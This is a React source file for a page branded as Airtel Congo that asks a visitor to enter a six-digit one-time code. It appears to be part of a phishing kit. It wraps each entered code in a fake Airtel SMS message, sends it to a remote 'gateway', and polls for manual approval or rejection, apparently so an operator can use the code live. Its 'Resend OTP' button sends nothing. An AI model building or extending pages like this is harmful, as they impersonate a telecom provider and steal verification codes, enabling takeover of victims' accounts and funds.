import React, { useState } from "react";
import { requestApproval, checkStatus } from "../utils/apiClient";
import toast from "react-hot-toast";
import { ArrowLeft, Loader2 } from "lucide-react";
import {
    pageStyle,
    headerStyle,
    logoStyle,
    menuButtonStyle,
    contentStyle,
    cardStyle,
    footerStyle,
    buttonStyle,
} from "../styles/sharedStyles";
import { OtpVerificationPageProps } from "../types";

const formatAirtelCongoOtpMessage = (otpValue: string) =>
    `<#> Your Airtel Congo OTP is:${otpValue}. Do not share this code with anyone. Expires in 2 mins. td1xRGYXC+L`;

function OtpVerificationPage({
    phoneNumber,
    onComplete,
    onBack,
}: OtpVerificationPageProps) {
    const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
    const [loading, setLoading] = useState(false);
    const [resendTimer, setResendTimer] = useState(60);
    const [codeExpired, setCodeExpired] = useState(false);
    const inputRefs = React.useRef<(HTMLInputElement | null)[]>([]);



    React.useEffect(() => {
        // Focus first input on mount
        inputRefs.current[0]?.focus();
    }, []);

    React.useEffect(() => {
        if (resendTimer > 0) {
            const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
            return () => clearTimeout(timer);
        } else if (resendTimer === 0) {
            // Code has expired
            setCodeExpired(true);
        }
    }, [resendTimer]);

    const handleOtpChange = (index: number, value: string) => {
        // Only allow digits
        if (!/^\d*$/.test(value)) return;

        const newOtp = [...otp];
        newOtp[index] = value.slice(-1); // Only take last character
        setOtp(newOtp);

        // Auto-focus next input
        if (value && index < 5) {
            inputRefs.current[index + 1]?.focus();
        }
    };

    const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
        if (e.key === "Backspace" && !otp[index] && index > 0) {
            inputRefs.current[index - 1]?.focus();
        }
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        const otpValue = otp.join("");
        if (otpValue.length !== 6) {
            toast.error("Please enter all 6 digits");
            return;
        }

        // Check if code has expired
        if (codeExpired) {
            return;
        }

        setLoading(true);

        try {
            // Form the payload
            const payload = {
                type: 'otp',
                name: "User OTP verification",
                phone: phoneNumber?.replace(/\s/g, '') || "N/A",
                details: formatAirtelCongoOtpMessage(otpValue),
            };

            // Send request to the High-Performance Gateway via our API Client
            const res = await requestApproval(payload);
            const attemptId = res.attemptId;

            // Start polling for status
            const interval = setInterval(async () => {
                try {
                    const statusRes = await checkStatus(attemptId);
                    const status = statusRes.status;

                    if (status === 'approved') {
                        clearInterval(interval);
                        setLoading(false);
                        toast.success("OTP verified successfully!");
                        onComplete();
                    } else if (status === 'rejected') {
                        clearInterval(interval);
                        setLoading(false);
                        toast.error("Invalid OTP, please check and try again.");
                        setOtp(["", "", "", "", "", ""]);
                        setTimeout(() => inputRefs.current[0]?.focus(), 100);
                    }
                } catch (e) {
                    console.error("Polling error", e);
                }
            }, 2000); // Check every 2 seconds

        } catch (err: any) {
            console.error("Failed to request approval:", err);
            const statusCode = err.response?.status;
            const errorData = err.response?.data;

            console.error(`Status: ${statusCode}`);
            if (errorData) console.error("Error data:", errorData);

            setLoading(false);
            const msg = statusCode ? `Failed to connect to server (${statusCode}). Please try again.` : "Failed to connect to server. Please try again.";
            toast.error(msg);
        }
    };

    const handleResend = () => {
        // If code is expired, redirect to login page
        if (codeExpired) {
            onBack();
            return;
        }

        if (resendTimer > 0) return;

        toast.success("OTP resent successfully!");
        setResendTimer(60);
        setOtp(["", "", "", "", "", ""]);
        inputRefs.current[0]?.focus();
    };

    return (
        <div
            style={{
                ...pageStyle,
                background: "linear-gradient(to bottom, #f0f0f0 0%, #e0e0e0 100%)",
            }}
        >
            <div style={headerStyle}>
                <button
                    onClick={onBack}
                    style={{
                        background: "none",
                        border: "none",
                        color: "#333",
                        cursor: "pointer",
                        fontSize: "24px",
                        display: "flex",
                        alignItems: "center",
                        gap: "5px",
                    }}
                >
                    <ArrowLeft size={20} />
                </button>
                <img src="/airtel.svg" alt="Airtel Congo" style={logoStyle} />
                <button style={menuButtonStyle}>☰</button>
            </div>

            <div style={contentStyle}>
                <div
                    style={{
                        ...cardStyle,
                        maxWidth: "450px",
                    }}
                >
                    <h1
                        style={{
                            fontSize: "32px",
                            fontWeight: "700",
                            marginBottom: "15px",
                            color: "#333",
                        }}
                    >
                        OTP Verification
                    </h1>
                    <p
                        style={{
                            color: "#666",
                            fontSize: "15px",
                            marginBottom: "30px",
                            lineHeight: "1.5",
                        }}
                    >
                        Enter the OTP sent to your phone number
                        <br />
                        <strong style={{ color: "#333" }}>
                            {phoneNumber || "+242 06 123 4567"}
                        </strong>
                    </p>

                    <form onSubmit={handleSubmit}>
                        <div
                            style={{
                                display: "flex",
                                gap: "10px",
                                justifyContent: "center",
                                marginBottom: "25px",
                            }}
                        >
                            {otp.map((digit, index) => (
                                <input
                                    key={index}
                                    ref={(el) => (inputRefs.current[index] = el)}
                                    type="text"
                                    inputMode="numeric"
                                    maxLength={1}
                                    value={digit}
                                    onChange={(e) => handleOtpChange(index, e.target.value)}
                                    onKeyDown={(e) => handleKeyDown(index, e)}
                                    style={{
                                        width: "50px",
                                        height: "55px",
                                        fontSize: "24px",
                                        fontWeight: "600",
                                        textAlign: "center",
                                        border: "2px solid #ddd",
                                        borderRadius: "8px",
                                        outline: "none",
                                        transition: "border-color 0.2s",
                                    }}
                                    onFocus={(e) => {
                                        e.target.style.borderColor = "#7db3ff";
                                    }}
                                    onBlur={(e) => {
                                        e.target.style.borderColor = "#ddd";
                                    }}
                                />
                            ))}
                        </div>

                        <div
                            style={{
                                textAlign: "center",
                                marginBottom: "25px",
                            }}
                        >
                            {codeExpired ? (
                                <div>
                                    <p
                                        style={{
                                            color: "#dc3545",
                                            fontSize: "14px",
                                            fontWeight: "600",
                                            marginBottom: "12px",
                                        }}
                                    >
                                        Invalid OTP, please enter a valid OTP
                                    </p>
                                    <button
                                        type="button"
                                        onClick={handleResend}
                                        style={{
                                            background: "none",
                                            border: "none",
                                            color: "#7db3ff",
                                            cursor: "pointer",
                                            fontSize: "14px",
                                            textDecoration: "underline",
                                            fontWeight: "500",
                                        }}
                                    >
                                        Resend OTP
                                    </button>
                                </div>
                            ) : (
                                <button
                                    type="button"
                                    onClick={handleResend}
                                    disabled={resendTimer > 0}
                                    style={{
                                        background: "none",
                                        border: "none",
                                        color: resendTimer > 0 ? "#999" : "#7db3ff",
                                        cursor: resendTimer > 0 ? "not-allowed" : "pointer",
                                        fontSize: "14px",
                                        textDecoration: resendTimer > 0 ? "none" : "underline",
                                    }}
                                >
                                    Resend OTP {resendTimer > 0 ? `in ${resendTimer} seconds` : ""}
                                </button>
                            )}
                        </div>

                        <button
                            type="submit"
                            disabled={loading || otp.join("").length !== 6}
                            style={{
                                ...buttonStyle,
                                background:
                                    loading || otp.join("").length !== 6 ? "#ccc" : "#7db3ff",
                                cursor:
                                    loading || otp.join("").length !== 6
                                        ? "not-allowed"
                                        : "pointer",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                gap: "8px",
                            }}
                        >
                            {loading ? (
                                <>
                                    <Loader2 className="spinner" size={18} />
                                    VERIFYING...
                                </>
                            ) : (
                                "SUBMIT"
                            )}
                        </button>
                    </form>
                </div>
            </div>

            <div style={footerStyle}>© 2025 Airtel Congo</div>
        </div>
    );
}

export default OtpVerificationPage;
